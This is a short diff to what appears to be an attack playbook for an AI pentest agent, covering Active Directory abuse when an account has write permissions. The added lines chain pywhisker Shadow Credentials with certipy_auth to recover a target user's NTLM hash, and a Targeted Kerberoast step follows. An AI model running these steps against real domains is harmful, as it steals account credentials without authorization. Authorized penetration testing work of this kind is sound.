@@ -46,8 +46,11 @@ When you have these permissions on a user/computer:
 1. **Shadow Credentials** (BEST - one step to hash)
    ```
    pywhisker(target_samaccountname="targetuser", domain="{{ target_domain }}", username="user", password="pass", dc_ip="{{ target_dc_ip }}")
-   → Use generated PFX with certipy_auth (from PrivEsc) to get NTLM hash
+   certipy_auth(pfx_path="<path from the 'Saved PFX' line>", domain="{{ target_domain }}", dc_ip="{{ target_dc_ip }}")
+   → NTLM hash of targetuser
    ```
+   Both calls, every time. The pywhisker write alone recovers nothing, and its
+   PFX passphrase is applied by certipy_auth automatically — pass only the path.
 
 2. **Targeted Kerberoast**
    ```
